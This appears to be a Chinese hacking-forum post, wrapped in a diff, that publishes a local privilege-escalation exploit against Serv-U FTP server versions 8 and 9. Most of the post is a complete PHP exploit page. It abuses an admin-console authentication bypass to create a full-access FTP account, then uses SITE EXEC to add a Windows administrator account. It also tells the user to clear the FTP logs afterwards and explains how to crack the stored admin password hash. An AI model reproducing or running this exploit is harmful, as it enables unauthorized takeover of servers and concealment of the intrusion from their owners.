@@ -1,0 +1,633 @@
+D0000D发往论坛板块-------------------------------------------------------
+No2  号板块  技术文章
+D8888D贴子标题-------------------------------------------------------
+Serv_U提权脚本，支持8 and 9版本
+D8888D主贴内容-------------------------------------------------------
+ 
+
+作者：空虚浪子心
+
+serv-u8的本地溢出，0改动支持serv-u9版本！
+
+受影响系统：
+serv-u8
+serv-u9
+
+描述：
+
+看cnbeta发现su出8这个版本了。
+
+想想以前写过一个7的本地提权。
+
+不知道8有什么安全方面的更改。
+
+下载来研究下，发现居然还是可以提权的，只是su7的那个不能直接用，稍微修改了下执行的流程。
+
+Su8的管理平台是http的，继承了su7的方式。
+抓包，分析，发现了以下路程是可以利用的。
+1， 管理员从管理控制台打开web页面时，是不需要验证密码的。
+2， 管理员如果用某URL打开web页面时，虽然需要输入密码，但是无论输入什么，都可以进入。“/?Session=39893&Language=zh,CN&localAdmin=1”
+3， 管理员可以添加用户有两种，一种是全局用户，一种是某个域下的用户。而权限设置也是两种，一种是全局，一种是针对用户。
+4， 管理员添加了用户的这个包和设置权限这个包，是分开的。
+所以，我可以抓包然后转换成php的socket连接post出去。
+最后在用经典的ftp登陆，exec命令。达到提权。
+
+前面su7已经说了很多，这里简单的说下好了。
+.....登陆什么的。
+1，获取ID。
+2，给这个id添加权限。
+3，给这个id赋予用户名，密码，目录，权限。
+4，登陆后执行系统命令。
+
+这段代码是不能直接当工具使用的。
+
+测试方法： [url=http://www.t00ls.net/#viewSource]链接标记预览源代码[/url] [url=http://www.t00ls.net/#printSource]链接标记打印[/url][url=http://www.t00ls.net/#about]链接标记关于[/url]001<?    
+
+002/*   
+
+003    serv-u 8 local exp ver 1.0   
+
+004    如果你在自己的服务器上发现这个文件，厄。。。那太遗憾了，别来找我。   
+
+005    这个文件到处都是，人人都能拿到。   
+
+006*/  
+
+007    
+
+008?>    
+
+009<html>    
+
+010    <title>Serv-u 8 local exp ver 1.0</title>    
+
+011    <body>    
+
+012    <script>    
+
+013    function fun_showDiv(show)    
+
+014    {    
+
+015        document.getElementById(show).style.display="block";    
+
+016    }    
+
+017    </script>    
+
+018    <b>Serv-u 8 local exp ver 1.0</b>    
+
+019        <form id="form1" name="form1" method="post" action="?">    
+
+020                <p><a href="#" onclick="fun_showDiv('adminpassdiv')">管理员密码</a>    
+
+021                  <input type="text" name="admin_pwd" value="" />    
+
+022              </p>    
+
+023              <p>直接提权！    
+
+024                  <input type="submit" name="cmd" value="提权" />      
+
+025                <a href="#" onclick="fun_showDiv('QAdiv')">QA</a>    
+
+026              </p>    
+
+027              <pre>    
+
+028    
+
+029<?    
+
+030    
+
+031//Global var    
+
+032    $port=43958;    
+
+033    $host="127.0.0.1";    
+
+034    $sessionid="";    
+
+035    $getuserid="";    
+
+036    $ftpport=21;    
+
+037    $ftpuser="lalala_hacked";    
+
+038    $ftppwd=$_POST['admin_pwd'];    
+
+039    $exec_addUser="site exec c:/windows/system32/net.exe user ".$ftpuser." ".$ftppwd." /add";    
+
+040    $exec_addGroup="site exec c:/windows/system32/net.exe localgroup administrators ".$ftpuser."  /add";    
+
+041    
+
+042if($_POST['cmd']) {    
+
+043    
+
+044//login-----------------------------------------    
+
+045    $sock_login = fsockopen($host, $port);    
+
+046    $URL='/Web%20Client/Login.xml?Command=Login&Sync=1543543543543543';    
+
+047    $post_data_login['user'] = "";    
+
+048    $post_data_login['pword'] = $ftppwd;    
+
+049    $post_data_login['language'] = "zh%2CCN&";    
+
+050    $ref="[url=http:///]链接标记http://[/url]".$host.":".$port."/?Session=39893&Language=zh,CN&LocalAdmin=1";    
+
+051    $postStr = createRequest($port,$host,$URL,$post_data_login,$sessionid,$ref);    
+
+052    fputs($sock_login, $postStr);    
+
+053    $result = fread($sock_login, 1280);     
+
+054    $sessionid = getmidstr("<sessionid>","</sessionid>",$result);    
+
+055    if ($sessionid!="")    
+
+056        echo "登陆成功！";    
+
+057    fclose($sock_login);    
+
+058//login-----------------------------------------    
+
+059    
+
+060//getOrganizationId-------------------------------    
+
+061    $OrganizationId="";    
+
+062    $sock_OrganizationId = fsockopen($host, $port);    
+
+063    $URL='/Admin/ServerUsers.htm?Page=1';    
+
+064    $postStr = createRequest($port,$host,$URL,"",$sessionid,"");    
+
+065    fputs($sock_OrganizationId, $postStr);    
+
+066    $resultOrganizationId="";    
+
+067    while(!feof($sock_OrganizationId)) {    
+
+068        $result = fread($sock_OrganizationId, 1024);        
+
+069        $resultOrganizationId=$resultOrganizationId.$result;    
+
+070    }    
+
+071    $strTmp = "OrganizationUsers.xml&ID=";    
+
+072    $OrganizationId = substr($resultOrganizationId,strpos($resultOrganizationId,$strTmp)+strlen($strTmp),strlen($strTmp)+15);    
+
+073    $OrganizationId = substr($OrganizationId,0,strpos($OrganizationId,"\""));    
+
+074    fclose($sock_OrganizationId);    
+
+075    if ($OrganizationId!="")    
+
+076        echo "获取OrganizationId".$OrganizationId."成功！";    
+
+077//getOrganizationId-------------------------------    
+
+078    
+
+079//getuserid---------------------------------------    
+
+080    $getuserid="";    
+
+081    $sock_getuserid = fsockopen($host, $port);    
+
+082    $URL="/Admin/XML/User.xml?Command=AddObject&Object=COrganization.".$OrganizationId.".User&Temp=1&Sync=546666666666666663";    
+
+083    $ref="[url=http:///]链接标记http://[/url]".$host.":".$port."/Admin/ServerUsers.htm?Page=1";    
+
+084    $post_data_getuserid="";    
+
+085    $postStr = createRequest($port,$host,$URL,$post_data_getuserid,$sessionid,$ref);    
+
+086    fputs($sock_getuserid, $postStr);    
+
+087    $result = fread($sock_getuserid, 1280);     
+
+088    $result = getmidstr("<var name=\"ObjectID\" val=\"","\" />",$result);    
+
+089    fclose($sock_getuserid);    
+
+090    $getuserid = $result;    
+
+091    if ($getuserid!="")    
+
+092        echo "获取用户ID".$getuserid."成功！";    
+
+093//getuserid---------------------------------------    
+
+094    
+
+095//addpower-----------------------------------------    
+
+096    $sock_addpower = fsockopen($host, $port);    
+
+097    $URL="/Admin/XML/Result.xml?Command=AddObject&Object=CUser.".$getuserid.".DirAccess&Sync=1227081437828";    
+
+098    $post_data_addpower['Access'] = "7999";    
+
+099    $post_data_addpower['MaxSize'] = "0";    
+
+100    $post_data_addpower['Dir'] = "c:\\";   
+
+101    $post_data_addpower['undefined'] = "undefined";   
+
+102    $postStr = createRequest($port,$host,$URL,$post_data_addpower,$sessionid,"[url=http://127.0.0.1/]链接标记http://127.0.0.1[/url]".":".$port."/Admin/ServerUsers.htm?Page=1");    
+
+103    fputs($sock_addpower, $postStr,strlen($postStr));    
+
+104    $result = fread($sock_addpower, 1280);      
+
+105    fclose($sock_addpower);    
+
+106         
+
+107    echo "添加权限成功！";   
+
+108   
+
+109//addpower-----------------------------------------   
+
+110   
+
+111//adduser-----------------------------------------   
+
+112    $sock_adduser = fsockopen($host, $port);   
+
+113    $URL="/Admin/XML/Result.xml?Command=UpdateObject&Object=COrganization.".$OrganizationId.".User.".$getuserid."&Sync=1227071190250";   
+
+114    $post_data_adduser['LoginID'] = $ftpuser;   
+
+115    $post_data_adduser['FullName'] = "";   
+
+116    $post_data_adduser['Password'] = 'hahaha';   
+
+117    $post_data_adduser['ComboPasswordType'] = "%E5%B8%B8%E8%A7%84%E5%AF%86%E7%A0%81";   
+
+118    $post_data_adduser['PasswordType'] = "0";   
+
+119    $post_data_adduser['ComboAdminType'] = "%E6%97%A0%E6%9D%83%E9%99%90";   
+
+120    $post_data_adduser['AdminType'] = "";   
+
+121    $post_data_adduser['ComboHomeDir'] = "/c:";   
+
+122    $post_data_adduser['HomeDir'] = "/c:";   
+
+123    $post_data_adduser['ComboType'] = "%E6%B0%B8%E4%B9%85%E5%B8%90%E6%88%B7";   
+
+124    $post_data_adduser['Type'] = "0";   
+
+125    $post_data_adduser['ExpiresOn'] = "0";   
+
+126    $post_data_adduser['ComboWebClientStartupMode'] = "%E6%8F%90%E7%A4%BA%E7%94%A8%E6%88%B7%E4%BD%BF%E7%94%A8%E4%BD%95%E7%A7%8D%E5%AE%A2%E6%88%B7%E7%AB%AF";   
+
+127    $post_data_adduser['WebClientStartupMode'] = "";   
+
+128    $post_data_adduser['LockInHomeDir'] = "0";   
+
+129    $post_data_adduser['Enabled'] = "1";   
+
+130    $post_data_adduser['AlwaysAllowLogin'] = "1";   
+
+131    $post_data_adduser['Description'] = "";   
+
+132    $post_data_adduser['IncludeRespCodesInMsgFiles'] = "";   
+
+133    $post_data_adduser['ComboSignOnMessageFilePath'] = "";   
+
+134    $post_data_adduser['SignOnMessageFilePath'] = "";   
+
+135    $post_data_adduser['SignOnMessage'] = "";   
+
+136    $post_data_adduser['SignOnMessageText'] = "";   
+
+137    $post_data_adduser['ComboLimitType'] = "%E8%BF%9E%E6%8E%A5";   
+
+138    $post_data_adduser['LimitType'] = "Connection";   
+
+139    $post_data_adduser['QuotaBytes'] = "0";   
+
+140    $post_data_adduser['Quota'] = "0";   
+
+141    $post_data_adduser['Access'] = "7999";   
+
+142    $post_data_adduser['MaxSize'] = "0";   
+
+143    $post_data_adduser['Dir'] = "%25HOME%25";   
+
+144    $postStr = createRequest($port,$host,$URL,$post_data_adduser,$sessionid,"[url=http://127.0.0.1/]链接标记http://127.0.0.1[/url]".":".$port."/Admin/ServerUsers.htm?Page=1");    
+
+145    fputs($sock_adduser, $postStr,strlen($postStr));    
+
+146    $result = fread($sock_adduser, 1280);       
+
+147    fclose($sock_adduser);    
+
+148         
+
+149    echo "添加用户成功！";   
+
+150//adduser-----------------------------------------   
+
+151   
+
+152   
+
+153   
+
+154//exec-------------------------------   
+
+155    $sock_exec = fsockopen("127.0.0.1", $ftpport, &$errno, &$errstr, 10);   
+
+156    $recvbuf = fgets($sock_exec, 1024);   
+
+157    $sendbuf = "USER ".$ftpuser."";   
+
+158    fputs($sock_exec, $sendbuf, strlen($sendbuf));   
+
+159    $recvbuf = fgets($sock_exec, 1024);   
+
+160   
+
+161    $sendbuf = "PASS hahaha";   
+
+162    fputs($sock_exec, $sendbuf, strlen($sendbuf));   
+
+163    $recvbuf = fgets($sock_exec, 1024);   
+
+164   
+
+165    $sendbuf = $exec_addUser."";   
+
+166    fputs($sock_exec, $sendbuf, strlen($sendbuf));   
+
+167    $recvbuf = fread($sock_exec, 1024);   
+
+168    echo "执行".$exec_addUser."返回了$recvbuf";   
+
+169    fclose($sock_exec);   
+
+170   
+
+171    $sock_exec = fsockopen("127.0.0.1", $ftpport, &$errno, &$errstr, 10);   
+
+172    $recvbuf = fgets($sock_exec, 1024);   
+
+173    $sendbuf = "USER ".$ftpuser."";   
+
+174    fputs($sock_exec, $sendbuf, strlen($sendbuf));   
+
+175    $recvbuf = fgets($sock_exec, 1024);   
+
+176   
+
+177    $sendbuf = "PASS hahaha";   
+
+178    fputs($sock_exec, $sendbuf, strlen($sendbuf));   
+
+179    $recvbuf = fgets($sock_exec, 1024);   
+
+180   
+
+181    $sendbuf = $exec_addGroup."";   
+
+182    fputs($sock_exec, $sendbuf, strlen($sendbuf));   
+
+183    $recvbuf = fread($sock_exec, 1024);   
+
+184   
+
+185    echo "执行".$exec_addGroup."返回了$recvbuf";   
+
+186    fclose($sock_exec);   
+
+187    echo "好了，自己3389上去清理ftp用户日志吧！";   
+
+188//exec-------------------------------   
+
+189   
+
+190}   
+
+191   
+
+192/** function createRequest   
+
+193    @port_post : administrator port $port=43958;   
+
+194    @host_post : host $host="127.0.0.1";   
+
+195    @URL_post : target $URL='/Web%20Client/Login.xml?Command=Login&Sync=1543543543543543';   
+
+196    @post_data_post : arraylist $post_data['user'] = "";...   
+
+197    @return httprequest string   
+
+198*/  
+
+199function createRequest($port_post,$host_post,$URL_post,$post_data_post,$sessionid,$referer){   
+
+200    $data_string="";   
+
+201    if ($post_data_post!="")   
+
+202    {   
+
+203        foreach($post_data_post as $key=>$value)   
+
+204        {   
+
+205            $values[]="$key=".urlencode($value);   
+
+206        }   
+
+207        $data_string=implode("",$values);   
+
+208    }   
+
+209    $request.="POST ".$URL_post." HTTP/1.1";   
+
+210    $request.="Host: ".$host_post."";   
+
+211    $request.="Referer: ".$referer."";   
+
+212    $request.="Content-type: application/x-www-form-urlencoded";   
+
+213    $request.="Content-length: ".strlen($data_string)."";   
+
+214    $request.="User-Agent: Serv-U";   
+
+215    $request.="x-user-agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; .NET CLR 1.1.4322)";   
+
+216    $request.="Accept: */*";   
+
+217    $request.="Cache-Contro: no-cache";   
+
+218    $request.="UA-CPU: x86";   
+
+219        
+
+220    if ($sessionid!="")   
+
+221    {   
+
+222        $request.="Cookie: Session=".$sessionid."";   
+
+223    }   
+
+224    $request.="";   
+
+225    $request.=$data_string."";   
+
+226   
+
+227    return $request;   
+
+228}   
+
+229   
+
+230//getMidfor2str copy from internet   
+
+231function getmidstr($L,$R,$str)   
+
+232{     
+
+233    $int_l=strpos($str,$L);   
+
+234    $int_r=strpos($str,$R);   
+
+235    If ($int_l>-1&&$int_l>-1)   
+
+236    {   
+
+237        $str_put=substr($str,$int_l+strlen($L),($int_r-$int_l-strlen($L)));   
+
+238        return $str_put;   
+
+239    }   
+
+240    else  
+
+241        return "没找到需要的变量";   
+
+242}   
+
+243?>   
+
+244              </pre>   
+
+245        </form>   
+
+246<div id="adminpassdiv" style="display:none">   
+
+247<pre>   
+
+248默认为空，如果密码为空，<b>填什么都能进去。</b>   
+
+249如果修改过，管理员密码默认会在这里：   
+
+250<b>C:\Program Files\RhinoSoft.com\Serv-U\Users\Local Administrator Domain\.Archive</b>   
+
+251文件中找到一个MD5密码值。   
+
+252C:\Program Files\RhinoSoft.com\Serv-U   
+
+253是su的根目录。   
+
+254密码值的样式为(假设是123456)   
+
+255kx#######################   
+
+256#代表123456的32位MD5加密，而kx则是su对md5的密码算法改进的随机2位字符。   
+
+257破解后的密码为<b>kx</b>123456，去掉kx就是密码了。   
+
+258你可以针对这个加密生成字典。   
+
+259   
+
+260   
+
+261</pre>   
+
+262</div>   
+
+263<div id="QAdiv" style="display:none">    
+
+264<pre>    
+
+265<b>提权的原理？</b>    
+
+266    Su8的管理平台是http的，继承了su7的方式。    
+
+267    抓包，分析，发现了以下路程是可以利用的。    
+
+268    1，  管理员从管理控制台打开web页面时，是不需要验证密码的。    
+
+269    2，  管理员如果用某URL打开web页面时，虽然需要输入密码，但是无论输入什么，都可以进入。“/?Session=39893&Language=zh,CN&LocalAdmin=1”    
+
+270    3，  管理员可以添加用户有两种，一种是全局用户，一种是某个域下的用户。而权限设置也是两种，一种是全局，一种是针对用户。    
+
+271    4，  管理员添加了用户的这个包和设置权限这个包，是分开的。    
+
+272    所以，我可以抓包然后转换成php的socket连接post出去。    
+
+273    最后在用经典的ftp登陆，exec命令。达到提权。    
+
+274         
+
+275    前面su7已经说了很多，这里简单的说下好了。    
+
+276    .....登陆什么的。    
+
+277    1，获取ID。    
+
+278    2，给这个id添加权限。    
+
+279    3，给这个id赋予用户名，密码，目录，权限。    
+
+280    4，登陆后执行系统命令。    
+
+281    
+
+282<b>为啥我明明显示成功了，但是却提不上去？</b>    
+
+283    这要看错误代码了，这里偶很惭愧，并没有写详细的错误代码判断。    
+
+284    一般有以下几种情况：    
+
+285    1，可能是因为管理员密码不对。    
+
+286        参照管理员密码的连接。    
+
+287    2，可能是因为管理员限制了执行SITE EXEC。    
+
+288        有待程序修改，程序可以加一个让他不限制的功能。    
+
+289    3，可能是程序问题。    
+
+290    
+
+291    
+
+292</pre>    
+
+293</div>    
+
+294    </body>    
+
+295</html>
+
